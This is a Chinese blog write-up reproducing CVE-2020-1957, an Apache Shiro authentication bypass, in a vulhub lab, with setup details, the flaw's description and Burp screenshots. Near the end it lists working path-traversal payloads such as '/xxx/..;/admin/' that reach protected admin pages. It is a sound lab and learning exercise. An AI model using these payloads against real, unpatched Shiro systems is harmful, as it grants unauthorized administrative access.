# CVE-2020-1957 Apache Shiro 认证绕过漏洞 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15717427.html`](https://www.cnblogs.com/peace-and-romance/p/15717427.html)

### 0X00-引言

* * *

走过多少路，见识到多少人生，懂得了多少道理，敢如何去评论别人对错。

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

工具：burpsuite

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro 框架直观、易用，同时也能提供健壮的安全性。

在 Apache Shiro 1.5.2 以前的版本中，在使用 Spring 动态控制器时，攻击者通过构造`..;`这样的跳转，可以绕过 Shiro 中对目录的权限限制。

这个应用中对 URL 权限的配置如下：

```
@Bean
public ShiroFilterChainDefinition shiroFilterChainDefinition() {
    DefaultShiroFilterChainDefinition chainDefinition = new DefaultShiroFilterChainDefinition();
    chainDefinition.addPathDefinition("/login.html", "authc"); // need to accept POSTs from the login form
    chainDefinition.addPathDefinition("/logout", "logout");
    chainDefinition.addPathDefinition("/admin/**", "authc");
    return chainDefinition;
} 
```

影响版本：Apache Shiro < 1.5.1

### 0X03-漏洞复现

* * *

![image-20211215153831233](img/f5bcb9046bb4d05f284c52d1027c6761.png)

burp 抓包-构造 url 访问管理页面-重定向到登录页面

![image-20211215154418849](img/a2078f4330ebe34bed0893279b6b2ab1.png)

构造恶意请求-成功绕过

![image-20211215154557713](img/08b328100036032b15b6f027fe8ac9f7.png)

![image-20211215154959948](img/258201bca363faaa14f82158ebd2f277.png)

payload 集合：

```
;/admin/
/;/admin/
/xxx/..;/admin/ 
```

### 0X04-免责声明

* * *

仅供学习参考

### 0X05-参考

* * *

[Apache Shiro 认证绕过漏洞（CVE-2020-1957）](https://github.com/vulhub/vulhub/blob/master/shiro/CVE-2020-1957/README.zh-cn.md)